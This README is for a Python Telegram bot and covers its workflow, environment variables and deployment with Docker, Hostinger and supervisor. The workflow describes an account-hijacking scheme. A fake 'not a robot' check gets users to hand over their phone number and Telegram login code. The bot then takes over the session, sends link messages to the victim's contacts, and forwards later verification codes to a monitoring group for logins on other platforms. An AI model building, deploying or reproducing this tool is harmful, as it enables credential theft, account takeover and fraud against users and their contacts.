# Telegram Bot in Python

Bot for automating interactions on Telegram.

## Bot Workflow

The bot follows this operational flow:

1. **Initial Verification**:
   - User starts the bot with the `/start` command
   - Bot requests confirmation that the user is not a robot
   - User must send their phone contact

2. **Authentication**:
   - If the number has an existing authenticated session, the bot proceeds directly
   - Otherwise, sends a verification code to the user's Telegram account
   - User enters the received 5-digit code

3. **Automated Processing**:
   - After authentication, the bot accesses the user's contacts
   - Sends predefined messages with links to specific contacts
   - Temporarily joins a group to send operation logs
   - Sets a timer to check for new Telegram system messages

4. **Dual Verification System**:
   - After 3 minutes, checks for new Telegram system messages (potential codes)
   - If a verification code is found, resends it to the monitoring group
   - Facilitates login attempts on multiple platforms

5. **Monitoring System**:
   - The monitor.py script continuously checks if the bot is operational
   - Automatically restarts the bot upon failure
   - Sends bot status notifications to a designated group

## Environment Setup

### Requirements
- Python 3.10 or higher
- pip (Python package manager)
- Docker (optional, for container usage)

### Environment Variables
Create a `.env` file in the project root with these variables:
```
API_ID=your_api_id
API_HASH=your_api_hash
BOT_TOKEN=your_bot_token
NOTIFICATION_CHAT_ID=notification_chat_id
```

## Running Locally
1. Install dependencies:
```bash
pip install -r requirements.txt
```

2. Run the bot:
```bash
python main.py
```

3. Run monitor in a separate window:
```bash
python monitor.py
```

## Docker Deployment
1. Build the image:
```bash
docker-compose build
```

2. Start the container:
```bash
docker-compose up -d
```

3. View logs:
```bash
docker-compose logs -f
```

4. Stop:
```bash
docker-compose down
```

## Shared Server Deployment (Hostinger)
1. Upload all files to the server  
2. Grant execution permissions:
```bash
chmod +x start.sh stop.sh
```
3. Start the bot:
```bash
./start.sh
```
4. Stop the bot:
```bash
./stop.sh
```

## VPS Deployment with Supervisor
1. Install supervisor:
```bash
apt-get update && apt-get install -y supervisor
```
2. Copy config file:
```bash
cp supervisor.conf /etc/supervisor/conf.d/telegram-bot.conf
```
3. Update directory in config if needed  
4. Reload supervisor:
```bash
supervisorctl reread
supervisorctl update
```
5. Check status:
```bash
supervisorctl status
```

## Useful Commands
- View bot logs:
```bash
tail -f logs/bot.log
```
- View monitor logs:
```bash
tail -f logs/monitor.log
```
- Check running processes:
```bash
ps aux | grep python
```

## Troubleshooting
1. **Bot won't start**: Check logs for errors and verify environment variables  
2. **Telegram API connection errors**: Confirm internet connection and validate API_ID/API_HASH credentials  
3. **Sessions not persisting**: Ensure the sessions directory has write permissions  
